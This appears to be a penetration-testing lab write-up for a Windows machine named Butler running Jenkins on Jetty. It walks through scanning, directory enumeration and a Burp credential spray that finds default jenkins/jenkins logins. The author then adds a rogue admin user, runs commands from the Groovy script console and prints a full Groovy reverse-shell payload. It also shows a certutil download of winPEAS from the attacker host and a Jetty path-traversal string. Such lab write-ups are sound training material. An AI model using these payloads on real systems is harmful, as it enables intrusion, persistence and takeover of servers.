# Butler

Target: 192.168.64.136

# Nmap enumeration nmap -sV -A -T4 -p- 192.168.64.136
    Nmap scan report for 192.168.64.136                                                        
    Host is up (0.0015s latency).                                                              
    Not shown: 65523 closed ports                                                              
    PORT      STATE SERVICE       VERSION                                                      
    135/tcp   open  msrpc         Microsoft Windows RPC                                        
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                
    445/tcp   open  microsoft-ds?                                                              
    5040/tcp  open  unknown                                                                    
    7680/tcp  open  tcpwrapped                                                                 
    8080/tcp  open  http          Jetty 9.4.41.v20210516                                       
    | http-robots.txt: 1 disallowed entry                                                      
    |_/
    |_http-server-header: Jetty(9.4.41.v20210516)
    |_http-title: Site doesn't have a title (text/html;charset=utf-8).
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    MAC Address: 00:0C:29:E5:A3:B4 (VMware)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.80%E=4%D=12/21%OT=135%CT=1%CU=31450%PV=Y%DS=1%DC=D%G=Y%M=000C29
    OS:%TM=6766C917%P=x86_64-pc-linux-gnu)SEQ(SP=10A%GCD=1%ISR=10A%TI=I%CI=I%II
    OS:=I%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5
    OS:=M5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF
    OS:70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
    OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
    OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
    OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
    OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
    OS:=N%T=80%CD=Z)
    
    Network Distance: 1 hop
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: 18h59m59s
    |_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:e5:a3:b4 (VMware)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2024-12-22T08:56:24
    |_  start_date: N/A
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   1.48 ms 192.168.64.136
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 544.32 seconds

## Nmap scan 1 results:
    135/tcp   open  msrpc         Microsoft Windows RPC                                        
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                
    445/tcp   open  microsoft-ds?                                                              
    5040/tcp  open  unknown                                                                    
    7680/tcp  open  tcpwrapped                                                                 
    8080/tcp  open  http          Jetty 9.4.41.v20210516                                       
    | http-robots.txt: 1 disallowed entry                                                      
    |_/
    |_http-server-header: Jetty(9.4.41.v20210516)
    
## Port 8080 
![image](https://github.com/user-attachments/assets/3c70c2f7-dcf9-4851-a86a-2736dcfa0199)

![image](https://github.com/user-attachments/assets/52a631a1-0dfe-4082-a915-dea8619810d1)

## Scan using nmap --script vuln 192.168.64.136
    Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
    root@kali:/home/kali# nmap --script vuln 192.168.64.136
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-21 10:03 EST
    Pre-scan script results:
    | broadcast-avahi-dos: 
    |   Discovered hosts:
    |     224.0.0.251
    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
    |_  Hosts are all up (not vulnerable).
    Nmap scan report for 192.168.64.136
    Host is up (0.00033s latency).
    Not shown: 996 closed ports
    PORT     STATE SERVICE
    135/tcp  open  msrpc
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    139/tcp  open  netbios-ssn
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    445/tcp  open  microsoft-ds
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    8080/tcp open  http-proxy
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | http-enum: 
    |_  /robots.txt: Robots file
    MAC Address: 00:0C:29:E5:A3:B4 (VMware)
    
    Host script results:
    |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
    
    Nmap done: 1 IP address (1 host up) scanned in 57.23 seconds

## Jetty9 looks to be interesting given there is an active Jenkins website om 8080
Through Googling, we have disocvered a Medium potential vulnerability that may provide some information disclosure.

### Jetty 9.4.41.v20210516 / Debian: CVE-2021-28169: jetty9 -- security update
    NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28169
    Rapid7: https://www.rapid7.com/db/vulnerabilities/debian-cve-2021-28169/

Exploit: /concat?/%2557EB-INF/web.xml

After some attempts of the above exploit and further research, no vulnerabilities can be found associated with the Jetty 9.4.41 version yet.

**CVE-2023-26049** Cookie Parser may leak information. 'There is a vulnerability in Eclipse Jetty that could allow a remote authenticated attacker to obtain sensitive information on the system.'  We are no an authenticated attacker.

**CVE-2021-34429** 'The vulnerability allows a remote attacker to gain unauthorized access to otherwise restricted functionality.
tried installing docker compose to see if i can download and replicate the Jetty infra. No success in downloading Docker Compose at all.

## GoBuster for website enumeration.
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -u http://192.168.64.136:8080/ --exclude-length 620 -v | grep "Status: 200"    

    root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -u http://192.168.64.136:8080/ --exclude-length 620 -v | grep "Status: 200"
    Found: /login                (Status: 200) [Size: 2028]
    Found: /oops                 (Status: 200) [Size: 6503]

    Explanation:
    --no-error: Suppresses error messages.
    --exclude-length 620: Excludes responses with a length of 620 (likely irrelevant results).
    -v: Enables verbose mode to show more detailed output.
    | grep "Status: 200": Filters the output to show only positive hits where the status code is 200.

## Wfuzz for website enumeration.
    wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.64.136:8080/FUZZ

    Explanation:
    -c:
    
    Enables colored output for better visibility.
    -z file,<path_to_wordlist>:
    
    Specifies the input method (a file-based wordlist in this case).
    Replace <path_to_wordlist> with the location of your wordlist (e.g., /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt). --hc 404:
    
    Excludes responses with an HTTP status code of 404 (Not Found) to reduce noise.
    http://192.168.64.136:8080/FUZZ:

    Seems like Wfuzz does not like the target machine. 
    
    root@kali:/home/kali# wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.64.136:8080/FUZZ
    
    Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
    
    ********************************************************
    * Wfuzz 2.4 - The Web Fuzzer                           *
    ********************************************************
    
    Target: http://192.168.64.136:8080/FUZZ
    Total requests: 220560
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                           
    ===================================================================
    
    Fatal exception: Pycurl error 7: Failed to connect to 192.168.64.136 port 8080: Connection refused

## Try found out more details on 192.168.64.136:8080 | curl -I http://192.168.64.136:8080
    root@kali:/home/kali# curl -i http://192.168.64.136:8080
    HTTP/1.1 403 Forbidden
    Date: Mon, 23 Dec 2024 14:18:13 GMT
    X-Content-Type-Options: nosniff
    Set-Cookie: JSESSIONID.6dd96482=node016xz31g05zqmvnn516yomsoak2.node0; Path=/; HttpOnly
    Expires: Thu, 01 Jan 1970 00:00:00 GMT
    Content-Type: text/html;charset=utf-8
    X-Hudson: 1.395
    X-Jenkins: 2.289.3
    X-Jenkins-Session: 19bdc77b
    Content-Length: 548
    Server: Jetty(9.4.41.v20210516)
    
    <html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>
    
    
    Authentication required
    <!--
    -->

</body></html>

## List of Jenkin vulnerabilities:
    https://www.cvedetails.com/vulnerability-list/vendor_id-15865/product_id-34004/version_id-1127237/Jenkins-Jenkins-2.289.3.html?page=2&order=1

**CVE-2024-43044** High The exploit will use the vulnerability to read files to forge a remember-me cookie for an admin account and gain access to Jenkins scripting engine. 

**CVE-2024-43044** Checker Python script. https://github.com/HwMex0/CVE-2024-43044?tab=readme-ov-file
Downloaded the custom script to identify if the current Jenkins version is vulnerable to CVE-2024-43044
    
    root@kali:/home/kali# python3 CVE-2024-43044.py http://192.168.64.136:8080
    [+] http://192.168.64.136:8080 (Jenkins Version: 2.289.3) is potentially vulnerable.
    root@kali:/home/kali# 

**POC:** https://github.com/convisolabs/CVE-2024-43044-jenkins

To firstly exploit Jenkins in this case we need to figure the 'Agent Node' if it is allowed on the endpoint without authentication.

Common Jenkins Endpoints to Test:

    Script Console:
    curl -i http://192.168.64.136:8080/computer/

    Manage Jenkins:
    curl -i http://192.168.64.136:8080/manage

    Jenkins API:
    curl -i http://192.168.64.136:8080/api/json

Test for Anonymous Access:

    Node Listings:
    curl -i http://192.168.64.136:8080/computer/

None of these command lines worked, making this slightly more diffuclt. In this instance, we could take it a step further and exploit another vulnerability against Jenkins or Jetty and attempt for it to disclose the Agent Header information to potential get one step further into exploiting CVE-2024-43044. In a real life scenario, this would probably be attempted but at this point it is clear for this box alone. It is beyond the scope and the design intentions.

## Furhter enumeration using Nikto web vulnerability scanner | nikto -h http://192.168.64.136:8080
    root@kali:/home/kali# nikto -h http://192.168.64.136:8080
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          192.168.64.136
    + Target Hostname:    192.168.64.136
    + Target Port:        8080
    + Start Time:         2024-12-24 01:36:01 (GMT-5)
    ---------------------------------------------------------------------------
    + Server: Jetty(9.4.41.v20210516)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + Uncommon header 'x-jenkins' found, with contents: 2.289.3
    + Uncommon header 'x-jenkins-session' found, with contents: d22a90da
    + Uncommon header 'x-hudson' found, with contents: 1.395
    + All CGI directories 'found', use '-C none' to test none
    + Uncommon header 'x-hudson-theme' found, with contents: default
    + Uncommon header 'x-instance-identity' found, with contents: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw43hS+kkhDV0LAwc2YVGFglH5IN1zZfBknSOOnM8uzQe2KSrC0PdLp+bTTNiK80Ill04oLGN5LBVAxwJ0koN0X2FPwGLqM6lJQlw9sESCUK0r6SfyTJJMZbsMaUKgwSFePnEbbheH4tPmNxGtI71812KggjsT22Oi5jKHv3rt2OM3dTa4Ma6jwLwke1Iz/rIYmRuW2pUanPVvyg7V2ZiWfqkMkWWs0WN9Y1MnGfyDrIGMYlDIFDZ1w2J25tBTzCR/tWMXOzyZh34hsbZX8a1bzFa7q+DsfL0D/hdDIG6pOuBO8JhffUsKe7qr4Xp2HQ1z/3AQLo4xYq8ojWOq7xX6wIDAQAB
    + Uncommon header 'cross-origin-opener-policy' found, with contents: same-origin
    + 26546 requests: 0 error(s) and 8 item(s) reported on remote host
    + End Time:           2024-12-24 01:36:57 (GMT-5) (56 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested

      *********************************************************************

Besides finding the public key usd in the x-instance-identity, no other direct findings can be found here. The base64 public key is normal information that is typically left disclosed and does not normally provide any direct attack opportunities.

## Now sucessful login has been made, Further enumeration is now required.

## Tried to connect to the SMB port with no access.
    root@kali:/home/kali# smbclient -L //192.168.64.136 -p 445
    Enter WORKGROUP\root's password: 
    session setup failed: NT_STATUS_ACCESS_DENIED
    root@kali:/home/kali# 

## Look to try exploiting the website directly next

![image](https://github.com/user-attachments/assets/8a6b42d3-5e28-4166-8d58-a408a55639ca)

First attempt at traffic interception with proxy.

![image](https://github.com/user-attachments/assets/b03352d6-ed03-4cc8-a539-756a0923df46)

## Tried to modify the session cookie with the one found in previous curl -I and Repat it back towards 192.168.64.136:8080 login page findings with no success.

![image](https://github.com/user-attachments/assets/990194ae-931a-4621-b04a-0266003dca65) 

![image](https://github.com/user-attachments/assets/ab057963-51ff-4ed0-8eed-2b74114819fb)

Change test1 with username and test1 to password. Attack type: Cluster bomb to make attempts against username and password spraying.

![image](https://github.com/user-attachments/assets/7ec2cb57-179c-4cc3-96b9-056c8d56c49e)

Payload Sets 1 (username)

![image](https://github.com/user-attachments/assets/bb46e8a2-fa16-473d-8cd7-f87e17e4e71e)

Payload sets 2 (password)

## Changed burpe Payload Sets 1 and 2 to a Small list
Bruteforce attempts was too slow, therefore proceeded to input my own smaller list 

![image](https://github.com/user-attachments/assets/a878b9dc-6472-44df-8046-05d16e994718)

![image](https://github.com/user-attachments/assets/7636917f-86fc-41ca-8c6d-d70423a205f7)

Through scan results, we have found an interesting shorter length result on jenkins / jenkins

Through right clicking and Requesting the url in browser, an attempt to input http://burp/repeat/2/qjlrtbat1ed0a8u5suxc90asqkxcqbhy takes us directly to a login page of user:jenkins with passwword: jenkins

![image](https://github.com/user-attachments/assets/6f069252-52f6-4b84-8990-bf827b616e1a)

## Got into Jenkins and added 'unrestricted' user:2 password:2 - To create an alternate login.

![image](https://github.com/user-attachments/assets/7b70ada5-c692-40cd-9c4f-23db8b56e424)

## Findings:
    Noted in the notificaiton centre, Jenkin has a ton of alerts detailing issues with the current build.
    System Info: http://192.168.64.136:8080/systemInfo
    Config Info: http://192.168.64.136:8080/configure
    Log Info: http://192.168.64.136:8080/log/all
    CLI Info: http://192.168.64.136:8080/cli/

![image](https://github.com/user-attachments/assets/7ad81ed6-0368-40a7-8065-73b071948f1b)

Tried the above url and input -ssh -user as jenkins with no success.

looked further on jenkins webpanel and discovered the 'script console' at http://192.168.64[.]136:8080/script.

![image](https://github.com/user-attachments/assets/fbb55ff0-e173-409a-a4e1-b4dee587bca7)

From this simple Groovy Script command we are user butler\butler.. very interesting here. (potentially already compromised into target) however further enumeration is required. We should look at creating a reverse shell further down the line as well.
    
    def cmd1 = "systeminfo".execute()
    println cmd1.text

    Result

    Host Name:                 BUTLER
    OS Name:                   Microsoft Windows 10 Enterprise Evaluation
    OS Version:                10.0.19043 N/A Build 19043
    OS Manufacturer:           Microsoft Corporation
    OS Configuration:          Standalone Workstation
    OS Build Type:             Multiprocessor Free
    Registered Owner:          butler
    Registered Organization:   
    Product ID:                00329-20000-00001-AA079
    Original Install Date:     8/14/2021, 3:51:38 AM
    System Boot Time:          12/28/2024, 9:00:28 PM
    System Manufacturer:       VMware, Inc.
    System Model:              VMware7,1
    System Type:               x64-based PC
    Processor(s):              2 Processor(s) Installed.
                               [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3000 Mhz
                               [02]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3000 Mhz
    BIOS Version:              VMware, Inc. VMW71.00V.14410784.B64.1908150010, 8/15/2019
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             en-us;English (United States)
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
    Total Physical Memory:     2,047 MB
    Available Physical Memory: 1,557 MB
    Virtual Memory: Max Size:  3,199 MB
    Virtual Memory: Available: 2,278 MB
    Virtual Memory: In Use:    921 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    WORKGROUP
    Logon Server:              N/A
    Hotfix(s):                 4 Hotfix(s) Installed.
                               [01]: KB4601554
                               [02]: KB5000736
                               [03]: KB5001330
                               [04]: KB5001405
    Network Card(s):           1 NIC(s) Installed.
                               [01]: Intel(R) 82574L Gigabit Network Connection
                                     Connection Name: Ethernet0
                                     DHCP Enabled:    Yes
                                     DHCP Server:     192.168.64.254
                                     IP address(es)
                                     [01]: 192.168.64.136
                                     [02]: fe80::cc33:3da3:d101:d60e
    Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

Above systeminfo shows us that the victim machine is operating on win10. To make things easier we will just try to establish a reverse shell to our box.

    root@kali:/home/kali/Downloads# nc -nlvp 5555
    listening on [any] 5555 ...

![image](https://github.com/user-attachments/assets/2ab7f09f-dc17-44e6-9375-2a6334e9e124)
Succesful.

Tried to telnet -a 192.168.64.129 5555 presented no yield. Other options that come to mind is to pivot and either use Powershell or get NC.exe downloaded on victim machine or have victim machine execute a malicious .ps script that will need to be currated for a reverse shell attempt.

## Since we already have a Script Console to work off, there should be easier methods to gain reverse shell.

A POC exists at https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

    String host="localhost";
    int port=8044;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

![image](https://github.com/user-attachments/assets/8c416491-60b3-4e4f-b3dd-12969672f6ee)

Reverse shell established. We are not NT authority system yet! 

Now that we have established a reverse shell back to our Linux machine, there is a multitude of methodes to attempt privilige escalation tactics. We have already conducted a cursory enumeration of the target via systeminfo.

## Other notable findings include the download of WiseCare365_5.6.7.568.exe inside the downloads folder.
![image](https://github.com/user-attachments/assets/a0ba783b-7944-49e3-a307-7432a652c853)

The same program was also present user Butler.

nukedefender.ps1 is likely just a powershell script created to allow the current lab to function properly without built in security interference.

## To help us in the second stages of post exploitation - enumeraiton phase, we can use a tool called winPEAS. 
    Once downloaded on Kali, and hosted in 'fire' (our dedicated transfer folder) 
    Execute file hosting on attacker machine via python -m SimpleHTTPServer
    Download winPEASx64 (renamed to winpease.exe) onto Jenkins shell: certutil.exe -urlcache -f http://192.168.64.129:8000/winpeas.exe winpeas.exe 

![image](https://github.com/user-attachments/assets/e51bcd8e-a8cc-4b8e-8648-eaf5741d0ba9)

![image](https://github.com/user-attachments/assets/4c72c1e9-93f0-4f20-9725-c115f3074041)

## Run winpease.exe on butler and analyse results.



### RED TEAM - Jenkins exploitation study: https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/
